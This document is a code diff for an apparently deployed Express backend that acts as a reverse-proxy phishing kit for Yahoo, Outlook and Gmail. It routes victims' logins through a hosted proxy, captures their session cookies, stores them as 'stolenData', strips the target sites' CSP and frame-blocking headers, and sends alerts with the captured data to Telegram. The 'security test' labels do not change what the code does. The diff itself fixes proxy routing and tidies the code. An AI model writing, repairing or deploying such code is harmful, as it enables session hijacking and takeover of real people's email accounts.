@@ -147,7 +147,7 @@ async function proxyRequest(target, path, req, res) {
       },
       method: req.method,
       body: req.method !== 'GET' && req.method !== 'HEAD' ? req.body : undefined,
-      redirect: 'manual' // Handle redirects manually
+      redirect: 'manual'
     });
 
     // 🍪 CAPTURE COOKIES FROM TARGET
@@ -155,7 +155,6 @@ async function proxyRequest(target, path, req, res) {
     if (setCookieHeader) {
       console.log(`🎯 CAPTURED ${target.name} COOKIES:`, setCookieHeader);
       
-      // Store captured cookies
       await storeProxyCookies(target.name, ip, setCookieHeader, targetUrl);
     }
 
@@ -164,7 +163,6 @@ async function proxyRequest(target, path, req, res) {
     if (userCookies) {
       console.log(`🎯 USER ${target.name} COOKIES:`, userCookies);
       
-      // Check if user has existing session
       const hasSession = target.cookieDomains.some(domain => 
         userCookies.includes(domain.replace('.', ''))
       );
@@ -179,11 +177,11 @@ async function proxyRequest(target, path, req, res) {
       const location = targetResponse.headers.get('location');
       if (location) {
         console.log(`🔀 Redirecting to: ${location}`);
-        return res.redirect(targetResponse.status, `/proxy/${target.name}${location}`);
+        return res.redirect(targetResponse.status, `/chukachina/proxy/${target.name}${location}`);
       }
     }
 
-    // Forward response headers (remove security headers)
+    // Forward response headers
     const headers = { ...targetResponse.headers.raw() };
     delete headers['content-security-policy'];
     delete headers['x-frame-options'];
@@ -195,7 +193,6 @@ async function proxyRequest(target, path, req, res) {
 
     res.status(targetResponse.status);
     
-    // Stream the response body
     const buffer = await targetResponse.buffer();
     res.send(buffer);
 
@@ -220,10 +217,8 @@ async function storeProxyCookies(target, ip, cookies, url) {
     note: `Captured via ${target} proxy`
   };
   
-  // Store locally
   await createDataFile(stolenData);
   
-  // Send Telegram alert
   const message = `🍪 <b>PROXY COOKIE CAPTURE</b>
 
 🎯 <b>Target:</b> ${target}
@@ -269,12 +264,16 @@ async function storeUserSessionCookies(target, ip, cookies, url) {
   await sendTelegramMessage(message);
 }
 
-// ==================== PROXY ROUTES ====================
+// ==================== FIXED PROXY ROUTES ====================
 
-// Main proxy endpoint - /proxy/yahoo/*
-router.use('/proxy/:target/*', async (req, res) => {
+// Option 1: Simple approach - handle all paths after /proxy/:target
+router.use('/proxy/:target', async (req, res) => {
   const targetName = req.params.target;
-  const path = '/' + (req.params[0] || '');
+  
+  // Extract the path after /proxy/:target
+  const originalUrl = req.originalUrl;
+  const basePath = `/chukachina/proxy/${targetName}`;
+  const path = originalUrl.replace(basePath, '') || '/';
   
   const target = PROXY_TARGETS[targetName];
   if (!target) {
@@ -286,12 +285,6 @@ router.use('/proxy/:target/*', async (req, res) => {
   }
   
   await proxyRequest(target, path, req, res);
-});
-
-// Root proxy redirect - /proxy/yahoo -> /proxy/yahoo/
-router.get('/proxy/:target', async (req, res) => {
-  const targetName = req.params.target;
-  res.redirect(`/proxy/${targetName}/`);
 });
 
 // ==================== DOWNLOAD ROUTES ====================
@@ -338,7 +331,6 @@ router.post('/', async (req, res) => {
     console.log('=== SECURITY TEST DATA RECEIVED ===');
     
     if (!req.body || typeof req.body !== 'object') {
-      console.log('Invalid request body received');
       return res.status(400).json({ 
         success: false, 
         message: "Invalid request body" 
@@ -355,7 +347,7 @@ router.post('/', async (req, res) => {
     }
     
     const data = req.body;
-    const ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
+    const ip = req.ip || req.connection.remoteAddress || 'Unknown';
     const location = geoip.lookup(ip);
     const locationStr = location ? `${location.city || 'N/A'}, ${location.country || 'N/A'}` : 'Unknown';
 
@@ -374,18 +366,16 @@ router.post('/', async (req, res) => {
       console.error('Error creating data file:', fileError);
     }
 
-    // Format and send Telegram message
-    const telegramMessage = formatTelegramMessage(data, ip, locationStr, deviceType, fileInfo);
-    const telegramResult = await sendTelegramMessage(telegramMessage);
+    // Send Telegram notification
+    const telegramResult = await sendTelegramMessage(
+      `📥 <b>NEW SECURITY TEST DATA</b>\n\nType: ${data.type || 'unknown'}\nTarget: ${targetDomain}\nIP: ${ip}`
+    );
     
     if (!telegramResult.success) {
       console.error('Failed to send Telegram notification:', telegramResult.error);
     }
 
-    console.log('📥 New Security Test Data:');
-    console.log('   Type:', data.type || 'unknown');
-    console.log('   Target Domain:', targetDomain);
-    console.log('   IP:', ip);
+    console.log('📥 New Security Test Data:', data.type, targetDomain, ip);
 
     res.status(200).json({
       success: true,
@@ -405,7 +395,7 @@ router.post('/', async (req, res) => {
       proxyInfo: {
         available: true,
         targets: Object.keys(PROXY_TARGETS),
-        yahooProxy: 'https://chuksinno-backend-1.onrender.com/chukachina/proxy/yahoo/'
+        yahooProxy: 'https://chuksinno-backend-1.onrender.com/chukachina/proxy/yahoo'
       },
       timestamp: new Date().toISOString()
     });
@@ -428,15 +418,9 @@ router.get('/proxy-info', (req, res) => {
     proxies: Object.keys(PROXY_TARGETS).map(key => ({
       name: key,
       target: PROXY_TARGETS[key].name,
-      url: `https://chuksinno-backend-1.onrender.com/chukachina/proxy/${key}/`,
-      baseUrl: PROXY_TARGETS[key].baseUrl,
-      cookieDomains: PROXY_TARGETS[key].cookieDomains
-    })),
-    usage: {
-      yahoo: 'https://chuksinno-backend-1.onrender.com/chukachina/proxy/yahoo/',
-      outlook: 'https://chuksinno-backend-1.onrender.com/chukachina/proxy/outlook/',
-      gmail: 'https://chuksinno-backend-1.onrender.com/chukachina/proxy/gmail/'
-    }
+      url: `https://chuksinno-backend-1.onrender.com/chukachina/proxy/${key}`,
+      baseUrl: PROXY_TARGETS[key].baseUrl
+    }))
   });
 });
 
@@ -456,10 +440,6 @@ router.get('/health', async (req, res) => {
         downloadEndpoint: true,
         proxyEndpoints: true,
         availableProxies: Object.keys(PROXY_TARGETS)
-      },
-      storage: {
-        directory: COOKIES_DIR,
-        exists: true
       }
     });
   } catch (error) {
@@ -470,11 +450,5 @@ router.get('/health', async (req, res) => {
     });
   }
 });
-
-// You'll need to add your formatTelegramMessage function here
-function formatTelegramMessage(data, ip, locationStr, deviceType, fileInfo) {
-  // Your existing formatTelegramMessage function implementation
-  // ... (include the full function from your previous code)
-}
 
 module.exports = router;
